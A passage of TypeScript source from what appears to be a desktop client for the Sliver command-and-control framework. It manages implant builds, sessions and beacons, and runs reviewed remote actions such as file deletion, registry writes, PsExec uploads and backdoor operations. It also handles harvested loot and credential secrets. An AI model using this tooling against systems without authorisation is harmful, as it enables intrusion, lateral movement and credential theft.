    case "target.kill":
      return target.mode === "session";
    case "session.close":
    case "sessions.prune-dead":
      return target.mode === "session";
    case "beacon.remove":
    case "beacons.prune-overdue":
      return target.mode === "beacon";
  }
}

function isBulkPruneAction(actionId: DestructiveTargetActionId): boolean {
  return actionId === "sessions.prune-dead" || actionId === "beacons.prune-overdue";
}

function sameTargetPlanResources(
  expected: readonly { summary: TargetSummary; ref: TargetRef }[],
  current: readonly { summary: TargetSummary; ref: TargetRef }[],
): boolean {
  const identity = (entry: { summary: TargetSummary; ref: TargetRef }) =>
    `${entry.summary.mode}:${entry.summary.id}:${entry.ref.fingerprint}`;
  const left = expected.map(identity).sort();
  const right = current.map(identity).sort();
  return sameStrings(left, right);
}

function jobSummary(job: clientpb.Job): JobSummary {
  return {
    id: job.ID,
    name: boundedText(job.Name, MAX_SUMMARY_TEXT),
    description: boundedText(job.Description, MAX_SUMMARY_TEXT),
    protocol: boundedText(job.Protocol, 64),
    port: job.Port,
    domains: boundedList(job.Domains, MAX_SUMMARY_LIST_ITEMS).map((domain) => boundedText(domain, MAX_SUMMARY_TEXT)),
    profileName: boundedText(job.ProfileName, MAX_SUMMARY_TEXT),
  };
}

function buildSummary(name: string, config: clientpb.ImplantConfig, staged: boolean): BuildSummary {
  return {
    name: boundedText(name, MAX_SUMMARY_TEXT),
    configId: boundedText(config.ID, MAX_SUMMARY_TEXT),
    target: `${boundedText(config.GOOS, 64)}/${boundedText(config.GOARCH, 64)}`,
    format: artifactFormatFromProto(config.Format),
    implantType: config.IsBeacon ? "beacon" : "session",
    c2: boundedList(config.C2, MAX_SUMMARY_LIST_ITEMS).map((endpoint) => endpointSummary(endpoint.URL)),
    staged,
  };
}

function profileSummary(profile: clientpb.ImplantProfile): ProfileSummary {
  const config = profile.Config;
  return {
    id: boundedText(profile.ID, MAX_SUMMARY_TEXT),
    name: boundedText(profile.Name, MAX_SUMMARY_TEXT),
    target: config ? `${boundedText(config.GOOS, 64)}/${boundedText(config.GOARCH, 64)}` : "Unknown",
    format: config ? artifactFormatFromProto(config.Format) : "executable",
    implantType: config?.IsBeacon ? "beacon" : "session",
    c2: config
      ? boundedList(config.C2, MAX_SUMMARY_LIST_ITEMS).map((endpoint) => endpointSummary(endpoint.URL))
      : [],
  };
}

function compilerTargetSummaries(compiler: clientpb.Compiler): CompilerTargetSummary[] {
  const summaries = new Map<string, CompilerTargetSummary>();
  for (const [supported, targets] of [
    [true, compiler.Targets],
    [false, compiler.UnsupportedTargets],
  ] as const) {
    for (const target of targets) {
      const summary = {
        os: boundedText(target.GOOS.toLowerCase(), 64),
        arch: boundedText(target.GOARCH.toLowerCase(), 64),
        format: artifactFormatFromProto(target.Format),
        supported,
      };
      summaries.set(`${summary.os}/${summary.arch}/${summary.format}`, summary);
    }
  }
  return [...summaries.values()].sort((left, right) =>
    `${left.os}/${left.arch}/${left.format}`.localeCompare(`${right.os}/${right.arch}/${right.format}`),
  );
}

export function negotiateServerVersion(version: clientpb.Version): {
  compatibility: "supported" | "degraded" | "unsupported";
  reason?: string;
} {
  const versionText = `${version.Major}.${version.Minor}.${version.Patch}`;
  if (
    !Number.isSafeInteger(version.Major) ||
    !Number.isSafeInteger(version.Minor) ||
    !Number.isSafeInteger(version.Patch) ||
    version.Major < 0 ||
    version.Minor < 0 ||
    version.Patch < 0
  ) {
    return { compatibility: "unsupported", reason: "The server reported an invalid version" };
  }
  // Sliver parses its build version as SemVer before returning these numeric
  // components. Compatibility follows the SemVer major/minor series; patch and
  // build provenance (Commit/Dirty) do not affect protocol compatibility.
  if (
    version.Major === SLIVER_PROTOCOL_COMPATIBILITY.major &&
    version.Minor === SLIVER_PROTOCOL_COMPATIBILITY.minor
  ) {
    return { compatibility: "supported" };
  }
  return {
    compatibility: "degraded",
    reason: `Sliver ${versionText} is outside the compatible ${SLIVER_PROTOCOL_COMPATIBILITY.series} version series and may be incompatible with this client`,
  };
}

function invalidatedDomainsForEvent(eventType: string): DomainName[] {
  switch (eventType.toLowerCase()) {
    case "job-started":
    case "job-stopped":
      return ["jobs"];
    case "build":
    case "build-completed":
    case "external-build":
    case "external-build-completed":
    case "external-acknowledge":
      return ["builds"];
    case "profile":
      return ["profiles"];
    case "session-connected":
    case "session-disconnected":
    case "session-updated":
      return ["sessions"];
    case "beacon-registered":
    case "beacon-taskresult":
      return ["beacons"];
    case "client-joined":
    case "client-left":
      return ["operators", "builders"];
    case "crackstation-connected":
    case "crackstation-disconnected":
      return ["crackstations"];
    default:
      return [];
  }
}

function emptyServiceInventory(): DomainCollection<InfrastructureServiceSummary> {
  return { status: "idle", revision: 0, items: [], page: { limit: MAX_DOMAIN_ITEMS, total: 0, truncated: false } };
}

function omitSnapshotKeys<T extends object>(value: T, keys: readonly (keyof T)[]): Partial<T> {
  const comparable: Partial<T> = { ...value };
  for (const key of keys) delete comparable[key];
  return comparable;
}

function rendererSnapshotState(snapshot: SliverSnapshot): unknown {
  const domain = <T>(value: DomainCollection<T>, preserveRevision = false): Partial<DomainCollection<T>> =>
    omitSnapshotKeys(value, preserveRevision ? ["updatedAt"] : ["updatedAt", "revision"]);

  return {
    ...omitSnapshotKeys(snapshot, ["lastUpdated"]),
    domains: {
      ...snapshot.domains,
      jobs: domain(snapshot.domains.jobs),
      builds: domain(snapshot.domains.builds),
      profiles: domain(snapshot.domains.profiles),
      compiler: domain(snapshot.domains.compiler),
      sessions: domain(snapshot.domains.sessions, true),
      beacons: domain(snapshot.domains.beacons, true),
      operators: domain(snapshot.domains.operators),
    },
    infrastructureServices: snapshot.infrastructureServices && {
      ...snapshot.infrastructureServices,
      builders: domain(snapshot.infrastructureServices.builders),
      crackstations: domain(snapshot.infrastructureServices.crackstations),
    },
    pivotTopology: snapshot.pivotTopology && omitSnapshotKeys(snapshot.pivotTopology, ["updatedAt", "revision"]),
  };
}

function sameRendererSnapshot(previous: SliverSnapshot, next: SliverSnapshot): boolean {
  // A bounded non-target inventory may hide changed entries beyond its first
  // page. Until these domains track full-catalog revisions, forward every
  // refresh while any of them is truncated.
  const boundedDomains = [
    next.domains.jobs,
    next.domains.builds,
    next.domains.profiles,
    next.domains.compiler,
    next.domains.operators,
    next.infrastructureServices?.builders,
    next.infrastructureServices?.crackstations,
  ];
  if (boundedDomains.some((domain) => domain?.page.truncated) || next.pivotTopology?.truncated) return false;
  // Poll timestamps and revisions for display-only inventories change even when
  // the renderer-visible data does not. Target revisions remain significant:
  // they also track changes outside the bounded page and bind target cursors.
  return isDeepStrictEqual(rendererSnapshotState(previous), rendererSnapshotState(next));
}

function domainWithStatus<T>(
  current: DomainCollection<T>,
  status: DomainStatus,
  error?: string,
): DomainCollection<T> {
  const next: DomainCollection<T> = { ...current, status };
  if (error) next.error = error;
  else delete next.error;
  return next;
}

function loadingDomain<T>(current: DomainCollection<T>): DomainCollection<T> {
  return domainWithStatus(current, "loading", current.error);
}

function committedDomain<T>(current: DomainCollection<T>, allItems: T[]): DomainCollection<T> {
  const items = allItems.slice(0, MAX_DOMAIN_ITEMS);
  const total = allItems.length;
  return {
    status: total === 0 ? "empty" : "ready",
    revision: current.revision + 1,
    items,
    page: {
      limit: MAX_DOMAIN_ITEMS,
      total,
      truncated: total > items.length,
      ...(total > items.length ? { nextCursor: String(items.length) } : {}),
    },
    updatedAt: new Date().toISOString(),
  };
}

function endpointSummary(value: string): string {
  const candidate = boundedText(value, 2_048);
  try {
    const parsed = new URL(candidate);
    if (!parsed.protocol) return "[invalid endpoint]";
    const scheme = boundedText(parsed.protocol.toLowerCase(), 32);
    const host = boundedText(parsed.host, MAX_SUMMARY_TEXT);
    return host ? boundedText(`${scheme}//${host}`, MAX_SUMMARY_TEXT) : boundedText(`${scheme}//`, 32);
  } catch {
    const scheme = /^([a-z][a-z0-9+.-]*):\/\//iu.exec(candidate)?.[1];
    return scheme ? `${scheme.toLowerCase()}://[redacted]` : "[invalid endpoint]";
  }
}

function boundedText(value: string, limit: number): string {
  const boundedInput = value.slice(0, Math.max(limit * 4, limit));
  const cleaned = boundedInput
    .replace(/[\u0000-\u001f\u007f-\u009f\u202a-\u202e\u2066-\u2069]/gu, " ")
    .replace(/\s+/gu, " ")
    .trim();
  return [...cleaned].slice(0, limit).join("");
}

function boundedList<T>(items: readonly T[], limit: number): T[] {
  return items.slice(0, limit);
}

function jobFingerprint(job: JobSummary | undefined): string {
  if (!job) return "missing";
  return createHash("sha256")
    .update(
      JSON.stringify({
        id: job.id,
        name: job.name,
        description: job.description,
        protocol: job.protocol,
        port: job.port,
        domains: [...job.domains].sort(),
        profileName: job.profileName,
      }),
    )
    .digest("hex");
}

function listenerFirewallProtocol(kind: ListenerInput["kind"]): ManagedListenerFirewallProtocol {
  return kind === "dns" || kind === "wireguard" ? "udp" : "tcp";
}

function managedFirewallImpactForJob(
  server: ManagedServerReference,
  job: JobSummary,
): JobStopManagedFirewallImpact | null {
  if (!isValidPort(job.port)) return null;
  const name = job.name.trim().toLowerCase();
  const protocol = job.protocol.trim().toLowerCase();
  const isDns = name === "dns" || name === "dns-listener" || protocol === "dns";
  const isWireGuard =
    name === "wg" ||
    name === "wireguard" ||
    name === "wg-listener" ||
    name === "wireguard-listener" ||
    protocol === "wg" ||
    protocol === "wireguard";
  const isTcpListener =
    name === "mtls" ||
    name === "mtls-listener" ||
    name === "http" ||
    name === "http-listener" ||
    name === "https" ||
    name === "https-listener" ||
    name === "tcp" ||
    name === "stage" ||
    name === "stage-listener" ||
    protocol === "mtls" ||
    protocol === "http" ||
    protocol === "https" ||
    protocol === "tcp" ||
    protocol === "stage" ||
    protocol === "stage-listener";
  if (!isDns && !isWireGuard && !isTcpListener) return null;
  return {
    server: { ...server },
    protocol: isDns || isWireGuard ? "udp" : "tcp",
    port: job.port,
  };
}

function sameManagedFirewallTuple(
  left: JobStopManagedFirewallImpact,
  right: JobStopManagedFirewallImpact | null,
): boolean {
  return right !== null && left.protocol === right.protocol && left.port === right.port;
}

function sameManagedServerDeployment(
  expected: ManagedServerReference,
  current: ManagedServerReference | null,
): boolean {
  return current !== null &&
    expected.deploymentId === current.deploymentId &&
    expected.provider === current.provider;
}

async function invokeManagedListenerFirewall(
  controller: ManagedListenerFirewallController,
  operation: "ensureIngress" | "removeIngress",
  input: ManagedListenerFirewallInput,
): Promise<ManagedListenerFirewallOutcome> {
  try {
    const result = await controller[operation](input);
    return result.ok
      ? result.value
      : { status: "failed", ruleCount: 0, error: result.error };
  } catch (error) {
    return { status: "failed", ruleCount: 0, error: errorMessage(error) };
  }
}

function sameStrings(left: readonly string[], right: readonly string[]): boolean {
  return left.length === right.length && left.every((value, index) => value === right[index]);
}

function abortable<T>(operation: Promise<T>, signal: AbortSignal): Promise<T> {
  if (signal.aborted) return Promise.reject(signal.reason ?? new Error("Operation canceled"));
  return new Promise<T>((resolve, reject) => {
    const aborted = (): void => reject(signal.reason ?? new Error("Operation canceled"));
    signal.addEventListener("abort", aborted, { once: true });
    operation.then(
      (value) => {
        signal.removeEventListener("abort", aborted);
        resolve(value);
      },
      (error: unknown) => {
        signal.removeEventListener("abort", aborted);
        reject(error);
      },
    );
  });
}

export function summarizeEvent(event: clientpb.Event): RecentEventSummary {
  const type = boundedText(event.EventType.toLowerCase(), 80) || "unknown";
  let message: string;
  switch (type) {
    case "job-started":
    case "job-stopped": {
      const action = type === "job-started" ? "started" : "stopped";
      const job = event.Job ? jobSummary(event.Job) : undefined;
      message = job
        ? `Job #${job.id} ${job.protocol || job.name || "listener"}:${job.port} ${action}`
        : `A server job ${action}`;
      break;
    }
    case "client-joined":
    case "client-left": {
      const action = type === "client-joined" ? "joined" : "left";
      const operator = boundedText(event.Client?.Operator?.Name ?? event.Client?.Name ?? "", MAX_SUMMARY_TEXT);
      message = operator ? `Operator ${operator} ${action}` : `An operator ${action}`;
      break;
    }
    case "session-connected":
    case "session-disconnected":
    case "session-updated": {
      const action = type.slice("session-".length);
      const session = boundedText(event.Session?.Name || event.Session?.ID || "", MAX_SUMMARY_TEXT);
      message = session ? `Session ${session} ${action}` : `A session ${action}`;
      break;
    }
    case "build":
    case "build-completed":
    case "external-build":
    case "external-build-completed":
    case "external-acknowledge":
      message = "Implant build inventory changed";
      break;
    case "profile":
      message = "Implant profile inventory changed";
      break;
    case "website":
      message = "Website inventory changed";
      break;
    case "canary":
      message = "A DNS canary event was reported";
      break;
    case "watchtower":
      message = "A threat-monitor event was reported";
      break;
    case "loot-added":
    case "loot-removed":
      message = "Loot inventory changed";
      break;
    case "beacon-registered":
      message = "A beacon registered";
      break;
    case "beacon-taskresult":
      message = "A beacon task completed";
      break;
    case "server-error":
      message = "The server reported an error";
      break;
    default:
      message = "A server event was received";
      break;
  }
  return {
    id: randomUUID(),
    type,
    at: new Date().toISOString(),
    message: boundedText(message, MAX_SUMMARY_TEXT),
    isError: Boolean(event.Err) || type === "server-error",
  };
}

async function saveArtifact(owner: BrowserWindow, response: clientpb.Generate): Promise<SavedArtifact> {
  const file = response.File;
  if (!file) throw new Error("Server returned no generated file");
  const suggestedFileName = safeArtifactFileName(file.Name || response.ImplantName);
  const implantName = boundedText(response.ImplantName, MAX_SUMMARY_TEXT);
  const buildId = boundedText(response.ImplantBuildID, MAX_SUMMARY_TEXT);
  try {
    if (owner.isDestroyed()) throw new Error("The application window was closed before the artifact could be saved");
    const selection = await dialog.showSaveDialog(owner, {
      title: "Save Generated Artifact",
      defaultPath: suggestedFileName,
    });

    if (selection.canceled || !selection.filePath) {
      return {
        fileName: suggestedFileName,
        size: file.Data.length,
        implantName,
        buildId,
        saved: false,
      };
    }

    await writeFile(selection.filePath, file.Data, { mode: 0o700 });
    if (process.platform !== "win32") await chmod(selection.filePath, 0o700);
    return {
      fileName: safeArtifactFileName(basename(selection.filePath)),
      size: file.Data.length,
      implantName,
      buildId,
      saved: true,
    };
  } finally {
    file.Data.fill(0);
  }
}

async function executeReviewedSessionAction(
  client: SliverClientAdapter,
  sessionId: string,
  input: PrepareSessionDestructiveActionInput,
  artifactData?: Buffer,
): Promise<void> {
  let response: { Response?: { Err?: string | undefined } | undefined } | undefined;
  let registryBinary: Buffer | undefined;
  try {
    switch (input.actionId) {
      case "session.filesystem.cp":
        response = await client.cpSession(sessionId, input.source, input.destination);
        break;
      case "session.filesystem.mv":
        response = await client.mvSession(sessionId, input.source, input.destination);
        break;
      case "session.filesystem.rm":
        response = await client.rmSession(sessionId, input.path, input.recursive, input.force);
        break;
      case "session.filesystem.chmod-recursive":
        response = await client.chmodSession(sessionId, input.path, input.fileMode, true);
        break;
      case "session.filesystem.chown-recursive":
        response = await client.chownSession(sessionId, input.path, input.uid, input.gid, true);
        break;
      case "session.filesystem.memfiles.rm":
        response = await client.memfilesRmSession(sessionId, input.fd);
        break;
      case "session.filesystem.upload-overwrite":
        if (!artifactData) throw new Error("The reviewed upload bytes are no longer available");
        if (input.isDirectory) throw new Error("Directory uploads are not supported by the bounded unary transfer path");
        response = await client.uploadSession(sessionId, input.remotePath, artifactData, {
          isIOC: input.isIOC,
          isDirectory: false,
          overwrite: true,
        });
        break;
      case "session.process.terminate":
        response = await client.terminateSessionProcess(sessionId, input.pid, input.force);
        break;
      case "session.service.stop":
        response = await client.stopServiceSession(sessionId, input.name);
        break;
      case "session.registry.write": {
        const value = sessionRegistryWriteValue(input.value);
        if (value.type === "binary") registryBinary = value.value;
        response = await client.registryWriteSession(sessionId, input.hive, input.path, input.key, value);
        break;
      }
      case "session.registry.create-key":
        response = await client.registryCreateKeySession(sessionId, input.hive, input.path, input.key);
        break;
      case "session.registry.delete-key":
        response = await client.registryDeleteKeySession(sessionId, input.hive, input.path, input.key);
        break;
      case "session.filesystem.edit-text-overwrite":
      case "session.filesystem.patch-hex":
        if (!artifactData) throw new Error("The staged editor artifact is no longer available");
        response = await client.uploadSession(sessionId, input.remotePath, artifactData, {
          isIOC: false,
          isDirectory: false,
          overwrite: true,
        });
        break;
    }
    const targetError = response?.Response?.Err?.trim();
    if (targetError) throw new SessionReviewedActionTargetRejectedError();
  } finally {
    registryBinary?.fill(0);
  }
}

function recursiveRemovalTargetsSelfOrRoot(path: string, platform: SessionTargetPlatform): boolean {
  const canonicalPath = path.normalize("NFC");
  if (canonicalPath === "." || canonicalPath === ".." || canonicalPath === "/" || canonicalPath === "\\") {
    return true;
  }
  const pathApi = platform === "windows" ? win32Path : posixPath;
  if (
    platform === "windows" &&
    /^[A-Za-z]:/u.test(canonicalPath) &&
    !win32Path.isAbsolute(canonicalPath)
  ) {
    return true;
  }
  const normalizedPath = pathApi.normalize(canonicalPath);
  const root = pathApi.parse(normalizedPath).root;
  if (root.length > 0 && normalizedPath === root) return true;
  const relativeWithoutTrailingSeparators = normalizedPath.replace(/[\\/]+$/u, "");
  return relativeWithoutTrailingSeparators === "." || relativeWithoutTrailingSeparators === "..";
}

function isSessionFileEditAction(
  input: PrepareSessionDestructiveActionInput,
): input is Extract<
  PrepareSessionDestructiveActionInput,
  { actionId: "session.filesystem.edit-text-overwrite" | "session.filesystem.patch-hex" }
> {
  return input.actionId === "session.filesystem.edit-text-overwrite" ||
    input.actionId === "session.filesystem.patch-hex";
}

function resolvedSessionOperationTarget(
  context: WindowContext,
  pool: BackendPool,
  target: RevalidatedTarget,
): ResolvedOperationTarget {
  return {
    ref: { ...target.ref },
    summary: { ...target.target },
    backend: operationBackendSummary(context, pool),
  };
}

function resolvedExecutionOperationTarget(
  context: WindowContext,
  pool: BackendPool,
  target: RevalidatedTarget,
): ResolvedOperationTarget {
  const authoritativeActiveC2 = pool.targetStore.authoritativeActiveC2(target.ref.mode, target.ref.id);
  return {
    ref: { ...target.ref },
    summary: { ...target.target },
    backend: operationBackendSummary(context, pool),
    ...(authoritativeActiveC2 ? { authoritativeActiveC2 } : {}),
  };
}

function executionBoundaryError(error: unknown): string {
  const message = error instanceof Error ? error.message : "";
  if (
    /^(Select a target|Select an active session|The selected target|The selected session|The selected Armory assembly|The selected \.NET (?:file|assembly)|The assembly type changed|The execution read|The execution review|The execution result|The requested execution output|The loot submission|Loot name is invalid|The current token identity|Too many execution|The global execution|This operation|Execution file selection|Could not open the native execution|Could not read the selected execution|Could not save the execution|The application window)/u.test(message)
  ) return boundedText(message, 512);
  return "The execution request failed at the protected main-process boundary";
}

function cloneExecutionActionResult(value: ExecutionActionResult): ExecutionActionResult {
  return {
    ...value,
    ...(value.output ? { output: value.output.map((item) => ({ ...item })) } : {}),
  };
}

function submittedExecutionReadResult(
  operationId: RunExecutionReadInput["operationId"],
  taskId: string,
): ExecutionReadResult {
  return operationId === "execution.children"
    ? {
        operationId,
        state: "submitted",
        taskId,
        items: [],
        total: 0,
        truncated: false,
      }
    : {
        operationId,
        state: "submitted",
        taskId,
        processName: "",
        processIntegrity: "",
        privileges: [],
        total: 0,
        truncated: false,
      };
}

function assertExecutionBeaconReadRequest(input: RunExecutionReadInput): void {
  if (!input.taskId) {
    if (input.cursor) throw new Error("The execution read cursor requires its exact beacon task");
    return;
  }
  if (
    input.cursor !== undefined &&
    !input.cursor.startsWith(`execution-read:v2:${input.operationId}:${input.taskId}:`)
  ) throw new Error("The execution read cursor does not belong to the selected beacon task");
}

function clearRefreshedExecutionBuffers(value: RefreshedExecutionBeaconTask): void {
  if (value.state !== "decoded" || value.decoded.kind !== "action") return;
  value.decoded.value.stdout?.fill(0);
  value.decoded.value.stderr?.fill(0);
}

function executionDraftUsesProfile(draft: ExecutionActionDraft): boolean {
  return draft.operationId === "execution.backdoor" ||
    (draft.operationId === "execution.psexec" && draft.source.kind === "profile") ||
    (draft.operationId === "execution.dll-hijack" && draft.source.kind === "profile");
}

function psexecRemoteBinaryPath(remoteDirectory: string): string {
  const normalizedDirectory = win32Path.normalize(remoteDirectory.trim());
  if (!/^[A-Za-z]:\\/u.test(normalizedDirectory) || normalizedDirectory.includes("\u0000")) {
    throw new ExecutionWorkbenchInputError("The reviewed service directory must be an absolute Windows drive path");
  }
  const basename = `sliver-${randomUUID().replaceAll("-", "").slice(0, 12)}.exe`;
  return win32Path.join(normalizedDirectory, basename);
}

function psexecUploadPath(hostname: string, remotePath: string): string {
  const host = hostname.trim();
  if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,254}$/u.test(host)) {
    throw new ExecutionWorkbenchInputError("The reviewed remote service hostname is invalid");
  }
  const normalized = win32Path.normalize(remotePath.trim());
  if (!/^[A-Za-z]:\\/u.test(normalized) || normalized.includes("\u0000")) {
    throw new ExecutionWorkbenchInputError("The reviewed service path must be an absolute Windows drive path");
  }
  const drive = normalized[0]!.toUpperCase();
  const suffix = normalized.slice(3);
  return `\\\\${host}\\${drive}$${suffix ? `\\${suffix}` : ""}`;
}

async function delayMilliseconds(milliseconds: number): Promise<void> {
  await new Promise<void>((resolveDelay) => {
    const timer = setTimeout(resolveDelay, milliseconds);
    timer.unref?.();
  });
}

function externalExecutionDescriptor(
  descriptor: ReturnType<typeof executionOperationDescriptor>,
  mutating: boolean,
  mode: TargetMode,
) {
  return Object.freeze({
    cancellation: mode === "beacon" ? "best-effort-beacon-task" as const : "not-supported" as const,
    outcomeUnknownAfterSubmission: mutating,
    startMessage: descriptor.submittedMessage,
    completionMessage: descriptor.completedMessage,
    failureMessage: descriptor.failedMessage,
    canceledMessage: "The execution operation was canceled before submission",
    partialMessage: "The execution operation completed only partially",
    outcomeUnknownMessage: "The execution operation was dispatched, but its outcome could not be confirmed",
    targetDisappearedMessage: "The selected target became unavailable before the execution operation completed",
    taskTimeoutSeconds: descriptor.timeoutSeconds,
  });
}

function sessionWorkbenchResultWasCanceled(result: { value: unknown }): boolean {
  return Boolean(
    result.value &&
    typeof result.value === "object" &&
    "status" in result.value &&
    result.value.status === "canceled",
  );
}

function sessionRegistryWriteValue(value: SessionRegistryWriteValue):
  | { type: "string"; value: string }
  | { type: "binary"; value: Buffer }
  | { type: "dword"; value: number }
  | { type: "qword"; value: string } {
  return value.type === "binary" ? { type: "binary", value: Buffer.from(value.hex, "hex") } : value;
}

function sessionActionPayloadDigest(
  input: PrepareSessionDestructiveActionInput,
  artifact?: SessionDestructiveActionPlan["artifact"],
  resourceFingerprint?: string,
): string {
  return createHash("sha256")
    .update(JSON.stringify({
      input,
      ...(artifact ? { artifact } : {}),
      ...(resourceFingerprint ? { resourceFingerprint } : {}),
    }))
    .digest("hex");
}

function exactSessionProcessIdentity(
  processes: readonly {
    Pid: number;
    Ppid: number;
    Executable: string;
    Owner: string;
    Architecture: string;
    CmdLine: string[];
  }[],
  pid: number,
): {
  resource: NonNullable<SessionDestructiveActionPlan["resource"]>;
  fingerprint: string;
} | undefined {
  const matches = processes.filter((process) => process.Pid === pid);
  if (matches.length !== 1) return undefined;
  const process = matches[0]!;
  const canonical = {
    pid,
    parentPid: Number.isSafeInteger(process.Ppid) && process.Ppid >= 0 ? process.Ppid : 0,
    executable: boundedText(process.Executable, 4_096),
    owner: boundedText(process.Owner, 4_096),
    architecture: boundedText(process.Architecture, 128),
    commandLine: boundedList(process.CmdLine.map((part) => boundedText(part, 4_096)), 64),
  };
  return {
    resource: {
      kind: "process",
      pid: canonical.pid,
      parentPid: canonical.parentPid,
      executable: canonical.executable,
      owner: canonical.owner,
      architecture: canonical.architecture,
    },
    fingerprint: createHash("sha256").update(JSON.stringify(canonical)).digest("hex"),
  };
}

function sessionActionWarning(input: PrepareSessionDestructiveActionInput): string {
  switch (input.actionId) {
    case "session.filesystem.cp":
      return "Copying may replace or truncate an existing destination file.";
    case "session.filesystem.mv":
      return "Moving may replace an existing destination on the remote operating system.";
    case "session.filesystem.rm":
      return input.recursive
        ? "This recursively removes the selected remote path and cannot be undone."
        : "This removes the selected remote path and cannot be undone.";
    case "session.filesystem.chmod-recursive":
    case "session.filesystem.chown-recursive":
      return "This recursively changes remote file metadata for every reachable child.";
    case "session.filesystem.memfiles.rm":
      return "This removes the selected in-memory file descriptor from the remote implant.";
    case "session.filesystem.upload-overwrite":
      return "This overwrites the remote destination with the exact file reviewed in this one-use plan.";
    case "session.filesystem.edit-text-overwrite":
    case "session.filesystem.patch-hex":
      return "This replaces remote file content after a best-effort digest preflight; the upstream RPC is not atomic.";
    case "session.process.terminate":
      return `This terminates remote process ${input.pid}${input.force ? " forcibly" : ""}.`;
    case "session.service.stop":
      return `This stops the Windows service '${input.name}'.`;
    case "session.registry.write":
      return "This overwrites a Windows registry value.";
    case "session.registry.create-key":
      return "This creates a Windows registry key on the remote host.";
    case "session.registry.delete-key":
      return "This deletes a Windows registry key and cannot be undone.";
  }
}

function sessionActionOutcome(
  plan: InternalSessionActionPlan,
  status: SessionDestructiveActionOutcome["status"],
  message: string,
): SessionDestructiveActionOutcome {
  return {
    actionId: plan.input.actionId,
    status,
    message: boundedText(message, MAX_SUMMARY_TEXT),
    payloadDigest: plan.payloadDigest,
  };
}

function sessionPlatform(value: string): SessionTargetPlatform {
  const normalized = value.trim().toLocaleLowerCase();
  if (normalized === "windows" || normalized === "linux" || normalized === "darwin") return normalized;
  throw new Error("The session operating system is not supported by the M2 workbench");
}

function validateListener(input: ListenerInput): void {
  if (!isValidPort(input.port)) throw new Error("Listener port must be between 1 and 65535");
  if (input.host.includes("\0")) throw new Error("Listener host is invalid");
  if (input.kind === "wireguard") {
    if (!isValidPort(input.tcpCommsPort) || !isValidPort(input.keyExchangePort)) {
      throw new Error("WireGuard auxiliary ports must be between 1 and 65535");
    }
  }
  if (input.kind === "dns" && splitList(input.domains).length === 0) throw new Error("At least one DNS domain is required");
  if (input.kind === "http" || input.kind === "https") {
    secondsToNanoseconds(input.longPollTimeoutSeconds);
    secondsToNanoseconds(input.longPollJitterSeconds);
    if (input.acme && input.certificateToken) throw new Error("Choose ACME or a certificate pair, not both");
  }
  if (input.kind === "stage" && !input.profileName.trim()) throw new Error("A stage profile is required");
}

function secondsToNanoseconds(seconds: number): string {
  if (!Number.isSafeInteger(seconds) || seconds < 0) throw new Error("Listener durations must be non-negative whole seconds");
  return (BigInt(seconds) * 1_000_000_000n).toString();
}

function requireKnownName(name: string, label: string): string {
  const normalized = name.trim();
  if (!normalized || normalized.length > 256 || normalized.includes("\0")) throw new Error(`${label} is invalid`);
  return normalized;
}

async function loadLootSummary(client: SliverClientAdapter, lootId: string): Promise<LootSummary> {
  const loot = await client.lootAll();
  try {
    const match = loot.find((item) => item.ID === lootId);
    if (!match) throw new Error("The selected loot is no longer available");
    return lootSummary(match);
  } finally {
    for (const item of loot) item.File?.Data.fill(0);
  }
}

function lootSummary(loot: clientpb.Loot): LootSummary {
  const id = operatorDataServerId(loot.ID, "loot");
  const name = boundedServerText(loot.Name, OPERATOR_DATA_LIMITS.nameCharacters) || "Untitled loot";
  const fileName = safeArtifactFileName(loot.File?.Name || name);
  const sizeBytes = loot.Size || String(loot.File?.Data.byteLength ?? 0);
  decimalByteSize(sizeBytes);
  return {
    id,
    name,
    fileName,
    fileType: loot.FileType === clientpb.FileType.TEXT ? "text" : "binary",
    originHostId: boundedServerText(loot.OriginHostUUID, 64),
    sizeBytes,
  };
}

function credentialSummary(credential: clientpb.Credential): CredentialSummary {
  const hasHash = credential.Hash.length > 0;
  return {
    id: operatorDataServerId(credential.ID, "credential"),
    username: boundedServerText(credential.Username, OPERATOR_DATA_LIMITS.usernameCharacters),
    collection: boundedServerText(credential.Collection, OPERATOR_DATA_LIMITS.collectionCharacters),
    originHostId: boundedServerText(credential.OriginHostUUID, 64),
    hashType: credential.HashType,
    hashTypeName: hasHash ? credentialHashTypeName(credential.HashType) : "None",
    isCracked: credential.IsCracked,
    hasPlaintext: credential.Plaintext.length > 0,
    hasHash,
  };
}

function credentialSecret(
  credential: clientpb.Credential,
  field: CopyCredentialSecretInput["field"],
): string {
  return field === "plaintext" ? credential.Plaintext : credential.Hash;
}

function clearCredentialSecrets(credential: clientpb.Credential): void {
  credential.Plaintext = "";
  credential.Hash = "";
}

function credentialHashTypeValues(): ReadonlySet<number> {
  return new Set(credentialHashTypeOptions().map((option) => option.value));
}

function credentialHashTypeOptions(): CredentialHashTypeOption[] {
  const options = Object.entries(clientpb.HashType)
    .filter((entry): entry is [string, number] => (
      typeof entry[1] === "number" &&
      entry[1] >= 0 &&
      entry[1] !== clientpb.HashType.INVALID
    ))
    .map(([name, value]) => ({
      value,
      name,
      label: hashTypeLabel(name),
    }));
  return [...new Map(options.map((option) => [option.value, option])).values()]
    .sort((left, right) => left.label.localeCompare(right.label) || left.value - right.value);
}

function credentialHashTypeName(value: number): string {
  if (value === clientpb.HashType.INVALID) return "Invalid";
  const name = clientpb.HashType[value];
  return typeof name === "string" ? name : `Unknown (${value})`;
}

function hashTypeLabel(name: string): string {
  return name
    .replaceAll("_", " ")
    .replace(/\bSha(\d)/giu, "SHA-$1")
    .replace(/\bMd(\d)/giu, "MD$1")
    .replace(/\bNtlm\b/giu, "NTLM");
}

function operatorDataPage<T>(
  items: readonly T[],
  cursor: string | undefined,
  requestedLimit: number | undefined,
): { items: T[]; page: LootCatalogPage["page"] } {
  const limit = requestedLimit ?? OPERATOR_DATA_LIMITS.pageSize;
  if (!Number.isSafeInteger(limit) || limit < 1 || limit > OPERATOR_DATA_LIMITS.maxPageSize) {
    throw new Error("The operator-data page size is invalid");
  }
  const offset = cursor === undefined ? 0 : Number(cursor);
  if (!Number.isSafeInteger(offset) || offset < 0) throw new Error("The operator-data cursor is invalid");
  const pageItems = items.slice(offset, offset + limit);
  const nextOffset = offset + pageItems.length;
  const truncated = nextOffset < items.length;
  return {
    items: pageItems,
    page: {
      limit,
      total: items.length,
      truncated,
      ...(truncated ? { nextCursor: String(nextOffset) } : {}),
    },
  };
}

function operatorDataServerId(value: string, label: string): string {
